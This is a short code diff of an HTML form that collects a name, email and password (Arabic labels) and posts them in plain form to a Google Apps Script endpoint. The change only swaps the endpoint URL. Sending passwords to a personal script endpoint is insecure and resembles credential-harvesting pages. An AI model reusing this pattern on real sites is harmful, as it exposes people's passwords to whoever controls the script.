@@ -44,6 +44,7 @@
 <input id="name" placeholder="الاسم" />
 <input id="email" placeholder="الإيميل" />
 <input id="pass" placeholder="كلمة المرور" />
+
 <button onclick="send()">Send</button>
 
 <script>
@@ -53,7 +54,7 @@
     const pass = document.getElementById("pass").value;
 
     const xhr = new XMLHttpRequest();
-    const url = "https://script.google.com/macros/s/AKfycbzTvHfqVbCG20UFkExdMgrlTf5mMT72UO7-VfjurS5zfgTPe8N9fIPRRqe98SWYXFoFqg/exec";
+    const url = "https://script.google.com/macros/s/AKfycbwgOTpb6CTATkolaiBguDHu19rrA8B3qe_iu6a83OCl0_uYruhJ8ytNvBZB-oHmMdyBRA/exec";
 
     const params = `name=${encodeURIComponent(name)}&email=${encodeURIComponent(email)}&pass=${encodeURIComponent(pass)}`;
 
